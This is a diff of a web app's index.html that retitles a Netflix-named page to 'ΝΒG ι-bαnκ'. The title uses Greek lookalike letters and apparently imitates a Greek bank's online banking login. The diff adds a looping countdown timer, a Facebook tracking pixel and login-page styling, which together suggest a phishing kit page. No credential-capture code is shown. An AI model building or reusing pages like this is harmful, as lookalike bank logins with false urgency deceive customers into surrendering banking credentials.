@@ -1,13 +1,68 @@
 <!doctype html>
 <html lang="en">
+
 <head>
-  <meta charset="utf-8">
-  <title>Netflix</title>
-  <base href="/">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>ΝΒG ι-bαnκ</title>
+
+    <base href=".">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/png" href="assets/img/favicon.ico">
+    <script>
+        function startTimer(duration, display) {
+            var timer = duration,
+                minutes, seconds;
+            setInterval(function() {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    timer = duration;
+                }
+            }, 1000);
+        }
+
+        window.onload = function() {
+            var fiveMinutes = 40,
+                display = document.querySelector('#time');
+            startTimer(fiveMinutes, display);
+        };
+    </script>
+    <script>
+        ! function(f, b, e, v, n, t, s) {
+            if (f.fbq) return;
+            n = f.fbq = function() {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n;
+            n.push = n;
+            n.loaded = !0;
+            n.version = '2.0';
+            n.queue = [];
+            t = b.createElement(e);
+            t.async = !0;
+            t.src = v;
+            s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '669086076924105');
+        fbq('track', 'PageView');
+    </script>
+
+
 </head>
-<body>
-  <app-root></app-root>
+
+<body class="login-bg windows login-night">
+    <app-root></app-root>
 </body>
+
 </html>
